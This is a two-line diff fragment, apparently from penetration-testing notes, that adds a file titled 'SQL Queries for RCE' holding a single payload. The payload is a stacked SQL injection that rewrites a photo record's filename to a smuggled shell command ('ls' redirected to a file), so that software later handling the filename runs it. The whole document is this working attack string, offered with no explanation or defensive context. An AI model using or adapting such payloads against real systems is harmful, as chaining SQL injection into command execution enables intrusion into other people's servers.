@@ -1,0 +1,2 @@
+SQL Queries for RCE
+;update photos set filename="*||ls>pentester2803.txt" where id=3;commit;--
